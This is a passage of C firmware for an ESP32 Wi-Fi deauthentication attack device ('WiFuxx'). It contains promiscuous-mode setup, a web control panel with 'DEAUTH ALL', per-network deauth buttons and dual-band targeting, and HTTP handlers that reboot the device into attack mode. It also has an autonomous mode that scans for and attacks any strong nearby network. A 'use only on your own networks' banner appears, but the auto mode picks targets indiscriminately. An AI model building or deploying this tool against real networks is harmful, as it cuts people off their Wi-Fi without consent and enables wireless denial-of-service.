            ESP_LOGI(TAG, "No strong signals, sleeping %ds...", AUTO_SCAN_INTERVAL_SEC);
        }

        ESP_LOGI(TAG, "Waiting %ds before next scan...", AUTO_SCAN_INTERVAL_SEC);
        vTaskDelay(pdMS_TO_TICKS(AUTO_SCAN_INTERVAL_SEC * 1000));
    }
}

// On the DevBoard there's no OLED, so scan/attack state goes to the serial
// console instead. The attack/scan tasks still publish into current_display_info
// (under display_mutex); this task mirrors it to the log, only emitting a line
// when something actually changes so the console doesn't flood.
static void status_log_task(void *pvParameters) {
    display_info_t info;
    char status_prev[sizeof(info.status)] = "";
    int  c24_prev = -1, c5_prev = -1;
    bool reset_logged = false;

    // In WebUI mode the panel itself is the interface; just announce how to reach it.
    if (g_webui_display) {
        ESP_LOGI(TAG, "WebUI up — join '%s', open http://%s or http://%s.local",
                 g_settings.ap_ssid, WEBUI_AP_IP, WEBUI_MDNS_HOST);
    }

    while (1) {
        // Factory-reset (10s BOOT hold in WebUI) — announced once before the reboot.
        if (g_webui_resetting) {
            if (!reset_logged) {
                ESP_LOGW(TAG, ">> FACTORY RESET — settings wiped to defaults, restarting...");
                reset_logged = true;
            }
            vTaskDelay(pdMS_TO_TICKS(200));
            continue;
        }

        // WebUI mode has no live scan/attack status to mirror.
        if (g_webui_display) { vTaskDelay(pdMS_TO_TICKS(1000)); continue; }

        if (display_mutex) {
            xSemaphoreTake(display_mutex, portMAX_DELAY);
            memcpy(&info, &current_display_info, sizeof(display_info_t));
            xSemaphoreGive(display_mutex);
        }

        bool changed = strncmp(info.status, status_prev, sizeof(status_prev)) != 0 ||
                       info.ap_count_24 != c24_prev || info.ap_count_5 != c5_prev;
        if (changed) {
            ESP_LOGI(TAG, "[%s] APs 2.4G:%d 5G:%d", info.status, info.ap_count_24, info.ap_count_5);
            for (int i = 0; i < info.ssid_count && i < 8; i++)
                ESP_LOGI(TAG, "  target: %s", info.ssid_list[i]);
            memcpy(status_prev, info.status, sizeof(status_prev));
            status_prev[sizeof(status_prev) - 1] = '\0';
            c24_prev = info.ap_count_24;
            c5_prev  = info.ap_count_5;
        }

        vTaskDelay(pdMS_TO_TICKS(1000));
    }
}

// ==================== Wi-Fi Initialisation ====================
static void wifi_init_sta(void) {
    led_state = LED_STATE_WIFI_INIT;
    esp_netif_init();
    esp_event_loop_create_default();
    esp_netif_create_default_wifi_sta();

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    wifi_check(esp_wifi_init(&cfg), "esp_wifi_init");
    wifi_check(esp_wifi_set_mode(WIFI_MODE_STA), "esp_wifi_set_mode");
    wifi_check(esp_wifi_start(), "esp_wifi_start");

    esp_err_t ret = esp_wifi_set_promiscuous(true);
    if (ret != ESP_OK)
        ESP_LOGE(TAG, "Failed to enable promiscuous mode: %s", esp_err_to_name(ret));

    ESP_LOGI(TAG, "╔════════════════════════════════════════╗");
    ESP_LOGI(TAG, "║          PRO DEAUTH PEN TEST           ║");
    ESP_LOGI(TAG, "║      OPTIMISED DUAL-BAND DEAUTHER      ║");
    ESP_LOGI(TAG, "╚════════════════════════════════════════╝");
    ESP_LOGI(TAG, "Wi-Fi STA + promiscuous enabled");
    ESP_LOGI(TAG, "2.4GHz burst: %d | 5GHz burst: %d", g_settings.burst_24, g_settings.burst_5);
    ESP_LOGI(TAG, "USE ONLY ON YOUR OWN NETWORKS!");
}

// ==================== WebUI: Embedded Page ====================
// Single self-contained page. HTML/CSS use single quotes and the JS uses
// backticks, so the whole document contains no double-quote characters and embeds
// in this C string literal without escaping. Dark theme adapted from the parked
// `webui` branch; reworked from WebSocket to plain fetch + the v2 REST endpoints.
static const char WEBUI_HTML[] =
"<!DOCTYPE html><html lang='en'><head>\n"
"<meta charset='UTF-8'>\n"
"<meta name='viewport' content='width=device-width, initial-scale=1.0, maximum-scale=1.0'>\n"
"<title>WiFuxx Control</title>\n"
"<link rel='icon' type='image/x-icon' href='/favicon.ico'>\n"
"<style>\n"
// gallusgadgets.com brand palette. Legacy var names kept to avoid churning every
// reference: --yellow is now warm body text, --cyan is the burnt-orange alt-brand
// accent, --orange is brand orange, --red is kept for destructive actions only.
":root{--bg:#15151B;--mid:#15151B;--card:#1C1C24;--border:#2C2C35;--yellow:#C8C3BB;--orange:#E8900A;--cyan:#C45C12;--muted:#8C857B;--red:#FF4444;}\n"
"*{box-sizing:border-box;margin:0;padding:0;}\n"
"body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:var(--bg);color:var(--yellow);min-height:100vh;padding-bottom:2rem;}\n"
"header{background:var(--bg);padding:1rem 1.25rem;border-bottom:2px solid var(--orange);position:sticky;top:0;z-index:10;}\n"
"header h1{color:var(--orange);font-size:1.6rem;letter-spacing:.05em;}\n"
"header p{color:var(--muted);font-size:.7rem;letter-spacing:.1em;text-transform:uppercase;margin-top:.2rem;}\n"
"main{max-width:540px;margin:0 auto;padding:1rem .75rem;display:flex;flex-direction:column;gap:1rem;}\n"
".card{background:var(--card);border-radius:10px;padding:1rem 1.25rem;border:1px solid var(--border);}\n"
".card h2{color:var(--orange);font-size:.85rem;letter-spacing:.1em;text-transform:uppercase;margin-bottom:.9rem;}\n"
".btn{display:block;width:100%;padding:.75rem 1rem;border-radius:7px;font-size:.95rem;font-weight:700;letter-spacing:.06em;cursor:pointer;border:2px solid transparent;background:var(--mid);color:var(--yellow);}\n"
".btn:active{transform:scale(.98);}\n"
".btn:disabled{opacity:.4;}\n"
".btn-orange{background:var(--orange);color:var(--bg);border-color:var(--orange);}\n"
".btn-cyan{background:transparent;color:var(--cyan);border-color:var(--cyan);}\n"
".scan-row{display:flex;gap:.75rem;align-items:center;}\n"
".scan-row .btn{width:auto;padding:.6rem 1.2rem;flex-shrink:0;}\n"
"#scanmsg{font-size:.8rem;color:var(--muted);}\n"
"#netlist{display:flex;flex-direction:column;gap:.6rem;}\n"
".net{background:var(--mid);border-radius:8px;border:1px solid var(--border);overflow:hidden;}\n"
".net-head{display:flex;align-items:center;gap:.5rem;padding:.6rem .9rem;}\n"
".net-ssid{flex:1;color:var(--yellow);font-weight:600;font-size:.9rem;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}\n"
".badge{font-size:.65rem;font-weight:700;padding:.15rem .4rem;border-radius:4px;}\n"
".b24{background:rgba(196,92,18,.15);color:var(--cyan);border:1px solid var(--cyan);}\n"
".b5{background:rgba(232,144,10,.15);color:var(--orange);border:1px solid var(--orange);}\n"
".dual{padding:0 .9rem .6rem;}\n"
".btn-dual{width:100%;padding:.45rem;font-size:.72rem;font-weight:700;border-radius:5px;border:1px solid var(--orange);background:transparent;color:var(--orange);cursor:pointer;}\n"
".bssid{display:flex;align-items:center;gap:.5rem;padding:.45rem .9rem;font-size:.75rem;border-top:1px solid rgba(255,255,255,.05);}\n"
".mac{color:var(--muted);font-family:monospace;flex:1;}\n"
".ch{color:var(--yellow);}\n"
".rssi{color:var(--muted);}\n"
".btn-sm{padding:.3rem .6rem;font-size:.7rem;font-weight:700;border-radius:5px;border:1px solid var(--red);background:transparent;color:var(--red);cursor:pointer;flex-shrink:0;}\n"
".empty{color:var(--muted);font-size:.85rem;text-align:center;padding:.5rem 0;}\n"
"#toast{position:fixed;left:50%;bottom:1.2rem;transform:translateX(-50%);background:var(--card);border:1px solid var(--orange);color:var(--yellow);padding:.7rem 1rem;border-radius:8px;font-size:.8rem;max-width:90%;text-align:center;display:none;z-index:20;}\n"
".spin{display:inline-block;width:14px;height:14px;border:2px solid var(--mid);border-top-color:var(--cyan);border-radius:50%;animation:s .7s linear infinite;vertical-align:middle;margin-right:6px;}\n"
"@keyframes s{to{transform:rotate(360deg);}}\n"
"footer{text-align:center;color:var(--muted);font-family:monospace;font-size:.7rem;letter-spacing:.05em;padding:1.25rem .75rem 0;}\n"
"footer .gg{color:var(--orange);}\n"
"label{display:block;font-size:.75rem;color:var(--muted);margin-bottom:.7rem;letter-spacing:.03em;}\n"
"label input{display:block;width:100%;margin-top:.3rem;padding:.5rem .6rem;background:var(--mid);border:1px solid var(--border);border-radius:6px;color:var(--yellow);font-size:.9rem;}\n"
".chk{display:flex;align-items:center;gap:.5rem;margin:.2rem 0 1rem;}\n"
".chk input{width:auto;margin:0;}\n"
"#cfgsave{margin-top:.2rem;}\n"
"#cfgreset{margin-top:.6rem;}\n"
"</style></head><body>\n"
"<header><h1>WiFuxx</h1><p>// by Gallus Gadgets</p></header>\n"
"<main>\n"
"<div class='card'><h2>Scan</h2><div class='scan-row'><button class='btn btn-cyan' id='scan'>SCAN</button><span id='scanmsg'>Tap SCAN to discover networks.</span></div></div>\n"
"<div class='card'><h2>Attack</h2><button class='btn btn-orange' id='all'>DEAUTH ALL</button></div>\n"
"<div class='card'><h2>Networks</h2><div id='netlist'><p class='empty'>No scan yet.</p></div></div>\n"
"<div class='card'><h2>Power</h2><button class='btn btn-cyan' id='auto'>AUTO MODE</button></div>\n"
"<div class='card'><h2>Update</h2>\n"
"<p id='fwver' class='empty' style='text-align:left;margin-bottom:.9rem'>Firmware --</p>\n"
"<label>Home Wi-Fi SSID<input id='home_ssid' maxlength='32'></label>\n"
"<label>Home Wi-Fi password<input id='home_pass' type='password' maxlength='63' placeholder='unchanged'></label>\n"
"<button class='btn btn-orange' id='update'>CHECK FOR UPDATE</button>\n"
"<p class='empty' style='text-align:left;margin-top:.7rem'>Unit reboots, joins your Wi-Fi, and checks GitHub for a newer release. Watch the serial console for progress.</p>\n"
"</div>\n"
"<div class='card'><h2>Settings</h2>\n"
"<label>AP SSID<input id='ap_ssid' maxlength='32'></label>\n"
"<label>AP channel (1-13)<input id='ap_channel' type='number' min='1' max='13'></label>\n"
"<label>2.4G threshold dBm (-95..-30)<input id='thr_24' type='number' min='-95' max='-30'></label>\n"
"<label>5G threshold dBm (-95..-30)<input id='thr_5' type='number' min='-95' max='-30'></label>\n"
"<label>2.4G burst (1-200)<input id='burst_24' type='number' min='1' max='200'></label>\n"
"<label>5G burst (1-200)<input id='burst_5' type='number' min='1' max='200'></label>\n"
"<label>WebUI user<input id='ui_user' maxlength='16' placeholder='blank = no login'></label>\n"
"<label>WebUI pass<input id='ui_pass' type='password' maxlength='32' placeholder='unchanged'></label>\n"
"<label class='chk'><input id='skip_splash' type='checkbox'> Skip boot splash</label>\n"
"<button class='btn btn-orange' id='cfgsave'>SAVE SETTINGS</button>\n"
"<button class='btn btn-cyan' id='cfgreset'>RESET TO DEFAULTS</button>\n"
"</div>\n"
"</main>\n"
"<footer>&gt;_ <span class='gg'>Gallus Gadgets</span> // hack your own</footer>\n"
"<div id='toast'></div>\n"
"<script>\n"
"const listEl=document.getElementById('netlist');\n"
"const msgEl=document.getElementById('scanmsg');\n"
"const scanBtn=document.getElementById('scan');\n"
"const toastEl=document.getElementById('toast');\n"
"const esc=s=>String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/'/g,'&#39;');\n"
"const toast=t=>{toastEl.textContent=t;toastEl.style.display='block';};\n"
"function gkey(n){return n.hidden?('h:'+n.mac):n.ssid;}\n"
"function group(nets){const m={};for(const n of nets){const k=gkey(n);(m[k]=m[k]||[]).push(n);}return m;}\n"
"function netLabel(aps){const n=aps[0];return n.hidden?('Hidden ('+n.mac+')'):n.ssid;}\n"
"function render(nets){\n"
"  if(!nets.length){listEl.innerHTML=`<p class='empty'>No networks found.</p>`;return;}\n"
"  const g=group(nets);let html='';\n"
"  for(const key in g){\n"
"    const aps=g[key];\n"
"    const title=netLabel(aps);\n"
"    const has24=aps.some(a=>a.band==='2.4');\n"
"    const has5=aps.some(a=>a.band==='5');\n"
"    html+=`<div class='net'><div class='net-head'><span class='net-ssid'>${esc(title)}</span>`;\n"
"    if(has24)html+=`<span class='badge b24'>2.4G</span>`;\n"
"    if(has5)html+=`<span class='badge b5'>5G</span>`;\n"
"    html+=`</div>`;\n"
"    if(has24&&has5&&!aps[0].hidden)html+=`<div class='dual'><button class='btn-dual' data-ssid='${esc(aps[0].ssid)}'>DUAL-BAND SAME AP</button></div>`;\n"
"    for(const a of aps){\n"
"      html+=`<div class='bssid'><span class='mac'>${a.mac}</span><span class='ch'>CH${a.channel}</span><span class='badge ${a.band==='5'?'b5':'b24'}'>${a.band}G</span><span class='rssi'>${a.rssi}</span><button class='btn-sm' data-mac='${a.mac}'>DEAUTH</button></div>`;\n"
"    }\n"
"    html+=`</div>`;\n"
"  }\n"
"  listEl.innerHTML=html;\n"
"}\n"
"scanBtn.onclick=()=>{\n"
"  scanBtn.disabled=true;msgEl.innerHTML=`<span class='spin'></span>Scanning`;\n"
"  fetch('/scan').then(r=>r.json()).then(d=>{render(d);msgEl.textContent=`${d.length} network${d.length===1?'':'s'} found`;})\n"
"  .catch(()=>{msgEl.textContent='Scan failed';}).then(()=>{scanBtn.disabled=false;});\n"
"};\n"
"function attack(body){\n"
"  toast('Command sent. Device is leaving WebUI to attack. Hold BOOT 2s to return.');\n"
"  fetch('/attack',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)}).catch(()=>{});\n"
"}\n"
"document.getElementById('all').onclick=()=>attack({mode:'all'});\n"
"document.getElementById('auto').onclick=()=>{\n"
"  if(!confirm('Return to autonomous mode? WiFuxx will scan and attack strong networks on its own.'))return;\n"
"  toast('Switching to Auto Mode...');\n"
"  fetch('/auto',{method:'POST'}).catch(()=>{});\n"
"};\n"
"listEl.onclick=e=>{\n"
"  const t=e.target;\n"
"  if(t.dataset.mac)attack({mode:'single',mac:t.dataset.mac});\n"
"  else if(t.dataset.ssid)attack({mode:'dualband',ssid:t.dataset.ssid});\n"
"};\n"
"const $=id=>document.getElementById(id);\n"
"$('update').onclick=()=>{\n"
"  const s=$('home_ssid').value.trim();\n"
"  if(!s){toast('Enter your home Wi-Fi SSID first');return;}\n"
"  if(!confirm('Reboot and check for a firmware update? The unit leaves the WebUI, joins your Wi-Fi, and updates only if a newer release exists. Watch the serial console.'))return;\n"
"  const b={ssid:s};if($('home_pass').value)b.pass=$('home_pass').value;\n"
"  toast('Rebooting to check for updates \\u2014 watch the serial console.');\n"
"  fetch('/update',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(b)}).catch(()=>{});\n"
"};\n"
"function loadCfg(){fetch('/config').then(r=>r.json()).then(c=>{\n"
"  $('ap_ssid').value=c.ap_ssid;$('ap_channel').value=c.ap_channel;$('thr_24').value=c.thr_24;$('thr_5').value=c.thr_5;\n"
"  $('burst_24').value=c.burst_24;$('burst_5').value=c.burst_5;$('ui_user').value=c.ui_user;$('skip_splash').checked=c.skip_splash;\n"
"  $('home_ssid').value=c.home_ssid||'';if($('fwver'))$('fwver').textContent='Firmware v'+(c.fw||'?');\n"
"}).catch(()=>{});}\n"
"loadCfg();\n"
"$('cfgsave').onclick=()=>{\n"
"  const b={ap_ssid:$('ap_ssid').value,ap_channel:+$('ap_channel').value,thr_24:+$('thr_24').value,thr_5:+$('thr_5').value,\n"
"    burst_24:+$('burst_24').value,burst_5:+$('burst_5').value,ui_user:$('ui_user').value,skip_splash:$('skip_splash').checked};\n"
"  if($('ui_pass').value)b.ui_pass=$('ui_pass').value;\n"
"  fetch('/config',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(b)})\n"
"    .then(r=>r.json()).then(d=>{toast(d.ok?'Saved. SSID/channel/login apply on next WebUI boot.':'Save failed');$('ui_pass').value='';})\n"
"    .catch(()=>toast('Save failed'));\n"
"};\n"
"$('cfgreset').onclick=()=>{\n"
"  if(!confirm('Reset all settings to defaults?'))return;\n"
"  fetch('/config/reset',{method:'POST'}).then(r=>r.json()).then(()=>{toast('Reset to defaults');loadCfg();}).catch(()=>toast('Reset failed'));\n"
"};\n"
"</script></body></html>";

// ==================== WebUI: Scan -> JSON ====================
// Fresh scan returning ALL nearby APs (no RSSI threshold) as the JSON array the
// WebUI list consumes: [{ssid,rssi,band,mac,channel}, ...]. Needs STA up, which
// WebUI mode provides via APSTA. Caller frees the result with cJSON_free().
static char *do_webui_scan_json(void) {
    wifi_scan_config_t scan_config = { .show_hidden = true };

    led_state = LED_STATE_SCANNING;
    esp_err_t err = esp_wifi_scan_start(&scan_config, true);
    led_state = LED_STATE_WEBUI_IDLE;
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "WebUI scan failed: %s", esp_err_to_name(err));
        return NULL;
    }

    uint16_t ap_num = 0;
    esp_wifi_scan_get_ap_num(&ap_num);
    wifi_ap_record_t *ap_info = ap_num ? calloc(ap_num, sizeof(wifi_ap_record_t)) : NULL;
    if (ap_num && !ap_info) {
        ESP_LOGE(TAG, "WebUI scan alloc failed (%u APs)", ap_num);
        return NULL;
    }
    if (ap_num && ap_info) {
        esp_wifi_scan_get_ap_records(&ap_num, ap_info);
        qsort(ap_info, ap_num, sizeof(wifi_ap_record_t), cmp_ap_rssi_desc);
    }

    cJSON *arr = cJSON_CreateArray();
    uint8_t count_24 = 0, count_5 = 0;

    for (int i = 0; i < ap_num && i < WEBUI_SCAN_MAX && ap_info; i++) {
        wifi_ap_record_t *ap = &ap_info[i];
        char mac[18];
        snprintf(mac, sizeof(mac), "%02x:%02x:%02x:%02x:%02x:%02x",
                 ap->bssid[0], ap->bssid[1], ap->bssid[2],
                 ap->bssid[3], ap->bssid[4], ap->bssid[5]);
        bool is5 = ap->primary > 14;
        if (is5) count_5++; else count_24++;

        cJSON *net = cJSON_CreateObject();
        bool hidden = (strlen((char *)ap->ssid) == 0);
        cJSON_AddStringToObject(net, "ssid",    hidden ? "" : (char *)ap->ssid);
        cJSON_AddBoolToObject  (net, "hidden",  hidden);
        cJSON_AddNumberToObject(net, "rssi",    ap->rssi);
        cJSON_AddStringToObject(net, "band",    is5 ? "5" : "2.4");
        cJSON_AddStringToObject(net, "mac",     mac);
        cJSON_AddNumberToObject(net, "channel", ap->primary);
        cJSON_AddItemToArray(arr, net);
    }
    if (ap_info) free(ap_info);

    ESP_LOGI(TAG, "WebUI scan: %d APs (%d on 2.4G, %d on 5G)",
             count_24 + count_5, count_24, count_5);

    if (display_mutex) {
        xSemaphoreTake(display_mutex, portMAX_DELAY);
        current_display_info.ap_count_24 = count_24;
        current_display_info.ap_count_5  = count_5;
        xSemaphoreGive(display_mutex);
    }

    char *out = cJSON_PrintUnformatted(arr);
    cJSON_Delete(arr);
    return out;
}

// ==================== WebUI: HTTP Handlers ====================
// Optional HTTP Basic auth. When a username is configured, every handler checks
// this first; with no username the WebUI stays open (default). On failure it
// emits a 401 challenge and the caller should just `return ESP_OK`.
static bool webui_authorized(httpd_req_t *req) {
    const char *expected = settings_expected_auth();
    if (!expected) return true;   // auth disabled

    char got[96];
    if (httpd_req_get_hdr_value_str(req, "Authorization", got, sizeof(got)) == ESP_OK
        && strcmp(got, expected) == 0) {
        return true;
    }
    httpd_resp_set_status(req, "401 Unauthorized");
    httpd_resp_set_hdr(req, "WWW-Authenticate", "Basic realm=\"WiFuxx\"");
    httpd_resp_set_type(req, "text/plain");
    httpd_resp_sendstr(req, "Authentication required");
    return false;
}

static esp_err_t root_get_handler(httpd_req_t *req) {
    if (!webui_authorized(req)) return ESP_OK;
    httpd_resp_set_type(req, "text/html");
    return httpd_resp_send(req, WEBUI_HTML, HTTPD_RESP_USE_STRLEN);
}

// Served without the auth guard so the browser tab icon loads even at the login
// prompt. Cached aggressively since it's a fixed asset.
static esp_err_t favicon_get_handler(httpd_req_t *req) {
    httpd_resp_set_type(req, "image/x-icon");
    httpd_resp_set_hdr(req, "Cache-Control", "max-age=86400");
    return httpd_resp_send(req, (const char *)favicon_ico, sizeof(favicon_ico));
}

static esp_err_t scan_get_handler(httpd_req_t *req) {
    if (!webui_authorized(req)) return ESP_OK;
    char *json = do_webui_scan_json();
    if (!json) { httpd_resp_send_500(req); return ESP_FAIL; }
    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, json);
    cJSON_free(json);
    return ESP_OK;
}

static bool parse_mac(const char *s, uint8_t out[6]) {
    unsigned int b[6];
    if (sscanf(s, "%x:%x:%x:%x:%x:%x", &b[0], &b[1], &b[2], &b[3], &b[4], &b[5]) != 6)
        return false;
    for (int i = 0; i < 6; i++) out[i] = (uint8_t)b[i];
    return true;
}

// POST /attack — store the chosen target selection in RTC and reboot into ATTACK.
// Body: {"mode":"all"} | {"mode":"single","mac":".."} | {"mode":"dualband","ssid":".."}
static esp_err_t attack_post_handler(httpd_req_t *req) {
    if (!webui_authorized(req)) return ESP_OK;
    char buf[256];
    int n = http_recv_body(req, buf, sizeof(buf));
    if (n <= 0) { httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, NULL); return ESP_FAIL; }

    cJSON *json = cJSON_Parse(buf);
    if (!json) { httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, NULL); return ESP_FAIL; }

    cJSON *mode_j   = cJSON_GetObjectItem(json, "mode");
    if (!mode_j || !cJSON_IsString(mode_j)) {
        cJSON_Delete(json);
        httpd_resp_set_status(req, "400 Bad Request");
        httpd_resp_set_type(req, "application/json");
        httpd_resp_sendstr(req, "{\"error\":\"missing mode\"}");
        return ESP_OK;
    }
    const char *mode = mode_j->valuestring;

    uint32_t sel = SEL_MODE_ALL;
    uint8_t  mac[6] = {0};
    char     ssid[33] = {0};
    bool     ok = true;

    if (strcmp(mode, "all") == 0) {
        sel = SEL_MODE_ALL;
    } else if (strcmp(mode, "single") == 0) {
        cJSON *mac_j = cJSON_GetObjectItem(json, "mac");
        if (mac_j && cJSON_IsString(mac_j) && parse_mac(mac_j->valuestring, mac))
            sel = SEL_MODE_SINGLE;
        else
            ok = false;
    } else if (strcmp(mode, "dualband") == 0) {
        cJSON *ssid_j = cJSON_GetObjectItem(json, "ssid");
        if (ssid_j && cJSON_IsString(ssid_j) && ssid_j->valuestring[0] != '\0') {
            strncpy(ssid, ssid_j->valuestring, sizeof(ssid) - 1);
            sel = SEL_MODE_DUALBAND;
        } else {
            ok = false;
        }
    } else {
        ok = false;
    }
    cJSON_Delete(json);

    if (!ok) {
        httpd_resp_set_status(req, "400 Bad Request");
        httpd_resp_set_type(req, "application/json");
        httpd_resp_sendstr(req, "{\"error\":\"bad target\"}");
        return ESP_OK;
    }

    g_sel_mode = sel;
    memcpy(g_sel_mac, mac, sizeof(g_sel_mac));
    strncpy(g_sel_ssid, ssid, sizeof(g_sel_ssid) - 1);
    g_sel_ssid[sizeof(g_sel_ssid) - 1] = '\0';

    ESP_LOGW(TAG, "WebUI attack request: mode=%s -> reboot into ATTACK", mode);
    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, "{\"ok\":true}");

    reboot_into(BOOT_MODE_ATTACK);  // short delay (response flush) then esp_restart()
    return ESP_OK;                  // not reached
}

// ==================== WebUI: Settings (GET/POST /config, POST /config/reset) ====================
static int clampi(int v, int lo, int hi) { return v < lo ? lo : (v > hi ? hi : v); }

// GET /config — current settings as JSON. ui_pass is never sent back.
static esp_err_t config_get_handler(httpd_req_t *req) {
    if (!webui_authorized(req)) return ESP_OK;

    cJSON *o = cJSON_CreateObject();
    cJSON_AddStringToObject(o, "ap_ssid",     g_settings.ap_ssid);
    cJSON_AddNumberToObject(o, "ap_channel",  g_settings.ap_channel);
    cJSON_AddNumberToObject(o, "thr_24",      g_settings.thr_24);
    cJSON_AddNumberToObject(o, "thr_5",       g_settings.thr_5);
    cJSON_AddNumberToObject(o, "burst_24",    g_settings.burst_24);
    cJSON_AddNumberToObject(o, "burst_5",     g_settings.burst_5);
    cJSON_AddStringToObject(o, "ui_user",     g_settings.ui_user);
    cJSON_AddBoolToObject  (o, "skip_splash", g_settings.skip_splash);
    cJSON_AddStringToObject(o, "home_ssid",   g_settings.home_ssid);   // home_pass never sent back
    cJSON_AddStringToObject(o, "fw",          fw_version());

    char *out = cJSON_PrintUnformatted(o);
    cJSON_Delete(o);
    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, out ? out : "{}");
    cJSON_free(out);
    return ESP_OK;
}

// POST /config — partial update; only the fields present in the body change.
// ui_pass is updated only when supplied, so it survives edits to other fields.
static esp_err_t config_post_handler(httpd_req_t *req) {
    if (!webui_authorized(req)) return ESP_OK;

    char buf[512];
    int n = http_recv_body(req, buf, sizeof(buf));
    if (n <= 0) { httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, NULL); return ESP_FAIL; }

    cJSON *j = cJSON_Parse(buf);
    if (!j) { httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, NULL); return ESP_FAIL; }

    cJSON *it;
    if ((it = cJSON_GetObjectItem(j, "ap_ssid")) && cJSON_IsString(it) && it->valuestring[0]) {
        strncpy(g_settings.ap_ssid, it->valuestring, sizeof(g_settings.ap_ssid) - 1);
        g_settings.ap_ssid[sizeof(g_settings.ap_ssid) - 1] = '\0';
    }
    if ((it = cJSON_GetObjectItem(j, "ap_channel")) && cJSON_IsNumber(it))
        g_settings.ap_channel = clampi(it->valueint, 1, 13);
    if ((it = cJSON_GetObjectItem(j, "thr_24")) && cJSON_IsNumber(it))
        g_settings.thr_24 = clampi(it->valueint, -95, -30);
    if ((it = cJSON_GetObjectItem(j, "thr_5")) && cJSON_IsNumber(it))
        g_settings.thr_5 = clampi(it->valueint, -95, -30);
    if ((it = cJSON_GetObjectItem(j, "burst_24")) && cJSON_IsNumber(it))
        g_settings.burst_24 = clampi(it->valueint, 1, 200);
    if ((it = cJSON_GetObjectItem(j, "burst_5")) && cJSON_IsNumber(it))
        g_settings.burst_5 = clampi(it->valueint, 1, 200);
    if ((it = cJSON_GetObjectItem(j, "ui_user")) && cJSON_IsString(it)) {
        strncpy(g_settings.ui_user, it->valuestring, sizeof(g_settings.ui_user) - 1);
        g_settings.ui_user[sizeof(g_settings.ui_user) - 1] = '\0';
    }
    if ((it = cJSON_GetObjectItem(j, "ui_pass")) && cJSON_IsString(it)) {
        strncpy(g_settings.ui_pass, it->valuestring, sizeof(g_settings.ui_pass) - 1);
        g_settings.ui_pass[sizeof(g_settings.ui_pass) - 1] = '\0';
    }
    if ((it = cJSON_GetObjectItem(j, "skip_splash")) && cJSON_IsBool(it))
        g_settings.skip_splash = cJSON_IsTrue(it);
    cJSON_Delete(j);

    esp_err_t e = settings_save();
    httpd_resp_set_type(req, "application/json");
    if (e == ESP_OK) {
        httpd_resp_sendstr(req, "{\"ok\":true}");
    } else {
        httpd_resp_set_status(req, "500 Internal Server Error");
        httpd_resp_sendstr(req, "{\"error\":\"save failed\"}");
    }
    return ESP_OK;
}

// POST /config/reset — wipe to factory defaults.
static esp_err_t config_reset_handler(httpd_req_t *req) {
    if (!webui_authorized(req)) return ESP_OK;
    settings_reset();
    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, "{\"ok\":true}");
    return ESP_OK;
}

// POST /auto — reboot into autonomous attack (threshold scan, no WebUI pick).
static esp_err_t auto_post_handler(httpd_req_t *req) {
    if (!webui_authorized(req)) return ESP_OK;
    g_sel_mode = SEL_MODE_ALL;
    memset(g_sel_mac, 0, sizeof(g_sel_mac));
    g_sel_ssid[0] = '\0';
    ESP_LOGW(TAG, "WebUI auto-mode request -> reboot into ATTACK (autonomous)");
    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, "{\"ok\":true}");
    reboot_into(BOOT_MODE_ATTACK);
    return ESP_OK;                  // not reached
}

// POST /update — save the home Wi-Fi creds (ssid required; pass only if supplied,
// so it survives leaving the field blank), then reboot into OTA mode to check
// GitHub. Body: {"ssid":"..","pass":".."}.
static esp_err_t update_post_handler(httpd_req_t *req) {
    if (!webui_authorized(req)) return ESP_OK;

    char buf[256];
    int n = http_recv_body(req, buf, sizeof(buf));
    if (n <= 0) { httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, NULL); return ESP_FAIL; }

    cJSON *j = cJSON_Parse(buf);
    if (!j) { httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, NULL); return ESP_FAIL; }

    cJSON *it;
    if ((it = cJSON_GetObjectItem(j, "ssid")) && cJSON_IsString(it) && it->valuestring[0]) {
        strncpy(g_settings.home_ssid, it->valuestring, sizeof(g_settings.home_ssid) - 1);
        g_settings.home_ssid[sizeof(g_settings.home_ssid) - 1] = '\0';
    }
    if ((it = cJSON_GetObjectItem(j, "pass")) && cJSON_IsString(it)) {
        strncpy(g_settings.home_pass, it->valuestring, sizeof(g_settings.home_pass) - 1);
        g_settings.home_pass[sizeof(g_settings.home_pass) - 1] = '\0';
    }
    cJSON_Delete(j);

    if (g_settings.home_ssid[0] == '\0') {
        httpd_resp_set_status(req, "400 Bad Request");
        httpd_resp_set_type(req, "application/json");
        httpd_resp_sendstr(req, "{\"error\":\"no ssid\"}");
        return ESP_OK;
    }

    if (settings_save() != ESP_OK) {
        httpd_resp_set_status(req, "500 Internal Server Error");
        httpd_resp_set_type(req, "application/json");
        httpd_resp_sendstr(req, "{\"error\":\"save failed\"}");
        return ESP_OK;
    }

    ESP_LOGW(TAG, "WebUI update request -> reboot into OTA (home AP '%s')", g_settings.home_ssid);
    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, "{\"ok\":true}");
    reboot_into(BOOT_MODE_OTA);      // short delay (response flush) then esp_restart()
    return ESP_OK;                   // not reached
}

// ==================== WebUI: HTTP Server ====================
static httpd_handle_t http_server = NULL;

static void http_server_start(void) {
    httpd_config_t config = HTTPD_DEFAULT_CONFIG();
    config.max_open_sockets = 7;    // LWIP cap: httpd reserves 3, so 7 is the safe max
    config.max_uri_handlers = 12;   // we register 9; headroom for future routes
    config.task_priority    = 4;
    config.stack_size       = 8192;
    config.lru_purge_enable = true;

    if (httpd_start(&http_server, &config) != ESP_OK) {
        ESP_LOGE(TAG, "HTTP server start failed");
        return;
    }

    httpd_uri_t uris[] = {
